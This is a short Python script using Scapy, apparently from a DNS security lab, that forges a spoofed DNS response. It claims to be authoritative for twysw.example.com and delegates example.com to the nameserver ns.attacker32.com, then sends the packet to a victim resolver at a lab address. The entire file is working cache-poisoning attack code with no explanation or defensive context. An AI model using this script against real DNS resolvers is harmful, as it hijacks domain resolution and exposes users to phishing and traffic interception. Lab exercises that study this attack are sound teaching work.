from scapy.all import *

# Parameters
victim_dns_server = '10.9.0.53'     # Victim's DNS server IP
attacker_dns_server = '10.9.0.153'  # Attacker's DNS server IP

name = 'twysw.example.com'  # hostname used in attack
domain = "example.com"
ns = "ns.attacker32.com"

Qdsec = DNSQR(qname=name)
Anssec = DNSRR(rrname=name,type='A',rdata='1.2.3.4',ttl=259200)  # Create DNS answer
NSsec = DNSRR(rrname=domain,type="NS",rdata=ns,ttl=259200)
dns = DNS(id=0xAAAA,aa=1,rd=1,qr=1,qdcount=1,ancount=1,nscount=1,arcount=0,qd=Qdsec,an=Anssec,ns=NSsec)  # DNS response packet

ip = IP(dst=victim_dns_server,src=attacker_dns_server)  # Attacker's DNS server ip -> Victim's DNS server ip
udp = UDP(dport=53, sport=53)                           # UDP header
response = ip / udp / dns                               # Full response packet

send(response)                                          # Send the packet
